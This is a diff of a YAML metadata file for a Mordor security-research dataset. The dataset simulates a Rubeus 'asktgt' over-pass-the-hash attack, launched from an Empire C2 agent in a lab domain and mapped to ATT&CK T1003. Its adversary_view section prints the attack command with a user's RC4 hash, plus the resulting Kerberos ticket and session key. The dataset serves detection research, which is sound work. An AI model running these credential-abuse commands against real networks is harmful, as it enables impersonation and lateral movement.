@@ -1,90 +1,106 @@
-title: Empire Rubeus ASKTGT
+title: Rubeus Userland ASKTGT PTT
 id: SDWIN-190319145126
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2019/03/19
-modification_date: 2019/03/19
+modification_date: 2020/09/21
 platform: Windows
-description: This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs
-dataset:
-  - type: Host
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_rubeus_asktgt_ptt.tar.gz
+tags:
+  - Over-Pass-The-Hash
+  - Not Touching LSASS
+description: This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass.
 attack_mappings:
   - technique: T1003
     sub-technique: "003"
     tactics:
       - TA0006
 notebooks:
-simulator:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_shell_rubeus_asktgt_ptt.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/network/empire_shell_rubeus_asktgt_ptt.zip
+simulation:
   environment: Mordor shire
   tools:
     - type: C2
       name: Empire
+      module: shell
+      script:
+    - type: binary
+      name: Rubeus
       module: asktgt
       script: https://github.com/GhostPack/Rubeus
   permissions_required:
     - User
   adversary_view: |-
-    (Empire: 2MES3XN6) > shell Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /ptt
-    [*] Tasked 2MES3XN6 to run TASK_SHELL
-    [*] Agent 2MES3XN6 tasked with task ID 21
-    (Empire: 2MES3XN6) > ______        _                      
+    (Empire: stager/multi/launcher) > agents
+
+    [*] Active agents:
+
+    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+    ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+    4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http            
+
+    (Empire: agents) > interact 4EH9PC5S
+    (Empire: 4EH9PC5S) > 
+    (Empire: 4EH9PC5S) > shell C:\users\sbeavers\Desktop\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt
+    [*] Tasked 4EH9PC5S to run TASK_SHELL
+    [*] Agent 4EH9PC5S tasked with task ID 2
+    (Empire: 4EH9PC5S) > 
+    ______        _                      
       (_____ \      | |                     
       _____) )_   _| |__  _____ _   _  ___ 
       |  __  /| | | |  _ \| ___ | | | |/___)
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v1.4.2 
+      v1.5.0 
 
     [*] Action: Ask TGT
 
-    [*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68
-    [*] Using domain controller: HFDC01.shire.com (172.18.39.5)
-    [*] Building AS-REQ (w/ preauth) for: 'shire.com\Mmidge'
+    [*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8
+    [*] Building AS-REQ (w/ preauth) for: 'theshire.local\pgustavo'
     [+] TGT request successful!
     [*] base64(ticket.kirbi):
 
-          doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB
-          AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6xLDFM5i+GcjKhK
-          ix5DoHwWPlrrbj4nPOcTyK/umBEnffx9hz7tu3acyQU127mvFR7u0JO3h6U6FPrKPz2iJ6v3sx5AYGM6
-          Imf0J2NBWb3+AU0WmuOBCa3k/BL+jl49isw6CuWHKrqyOk7SaoRORdd9G0hDv5zpHeF5Nzfz4dQ3GqmO
-          W2ORZuTQR868MYEFYnCIjY+wNf/ve9Cie6isW170KSEMPrWdQbeSFMu6KtJaCNLTc2800JTO3ObrOZUW
-          zylDRelTgBY4FCTyBUaseF45EWwFyiMeeABhgUZ1iFPGezsplcczGpaYB19bLz2r89j5k+3IJGzyOcA9
-          hECNycNVzycIcU4SUtKtxqiRLoPqfPjHq8codY1npbUsovsW6wEi25lgFxzlVdxF2Bek368qBU1B1s9g
-          CL06GUSjlfjPj9Heb7exTr9r+4j4JL+qVZaqlBtAQ4J38CKNJ9RdZME/9wRg6I/E15P8NNUAr7IOyF6S
-          cYlNQ07uRFRKBgi30JSdBC7CSe2x546Jrrd17YQtDOHbw1WFP7HvYgdT+Miuit/WoRttWmNTEv4vj6oD
-          +AuTrQKxnhbebef6MXXsR4ouDrBIlIw6r5T476ezkbNJeQwB6oryMUOsI3wu3DDFdRD7ZBY869fSC7Xe
-          1+6vRO4Vu/mUXYzw9xkJ0C7X+c4ljJetCZ/YV3zoc6Tw5WLjtfFJ0HuFdIxxOEj8xK0BoyGwnDz3fOGC
-          mEjH47U/w0EsUdBmnsZzRTujrTwGFbm/oCjOV9Dgae/aVLe0A+TSrWH2H8aKFmGeczrtTgEkGZDJyudm
-          bVdeymTc0bv8AT8s0moOKc64dhtib10LPnakbWDOSQOydi/abwuIaAB6+21F3cmZ9lq5/7e1LyYKWnxd
-          ATHPz+M9kWJi+xeqombWvozrjM2uIozFik7nY0rMdrbd/ItlML7bCuOuybksFe/1mmwscWvCoTOePzNS
-          NU2znzc8vDOSfaE5WLI9c1hJVjkarx9iL+kSM7N3yQEXkuwQuTY5Yswx1bht28sKjsU+Q0dZxdhNeErd
-          lJekqyf5NAKI2fmawmWBmzcXm7NDRATgDf3N9tpiTOW0x0Blv2F+SWXparZ06E5wdqNsV4l2Yf9x6yOp
-          exrQvjCznKbpbh0u1rlhm0Ya8yieDqbCKEIzxIk1IjYwx/4OQ6fdGAm6SjF+rH/Pnyh/o5X4DxLSeGEy
-          LPDjuDBHuReqj4UP//bhH7r5UptZuQ+cZ5liu58eo4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw
-          ga6gGzAZoAMCARehEgQQfj5vhePBJY0eMPFDHvkIxKELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN
-          bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxODU1NDlaphEYDzIwMTkwMzIwMDQ1NTQ5WqcRGA8yMDE5
-          MDMyNjE4NTU0OVqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=
-
-    [*] Action: Import Ticket
+          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
+          MBgbBmtyYnRndBsOdGhlc2hpcmUubG9jYWw=
     [+] Ticket successfully imported!
 
-    [*] Action: Describe Ticket
-
-      UserName              :  Mmidge
-      UserRealm             :  SHIRE.COM
-      ServiceName           :  krbtgt/shire.com
-      ServiceRealm          :  SHIRE.COM
-      StartTime             :  3/19/2019 1:55:49 PM
-      EndTime               :  3/19/2019 11:55:49 PM
-      RenewTill             :  3/26/2019 1:55:49 PM
+      ServiceName           :  krbtgt/theshire.local
+      ServiceRealm          :  THESHIRE.LOCAL
+      UserName              :  pgustavo
+      UserRealm             :  THESHIRE.LOCAL
+      StartTime             :  9/21/2020 10:39:13 PM
+      EndTime               :  9/22/2020 8:39:13 AM
+      RenewTill             :  9/28/2020 10:39:13 PM
       Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
       KeyType               :  rc4_hmac
-      Base64(key)           :  fj5vhePBJY0eMPFDHvkIxA==
-
+      Base64(key)           :  ZO21dWzTLeccdZTeq4SgMA==
 
     ..Command execution completed.
 
-    (Empire: 2MES3XN6) >
+    (Empire: 4EH9PC5S) >
 references:
+  - https://github.com/GhostPack/Rubeus#example-over-pass-the-hash
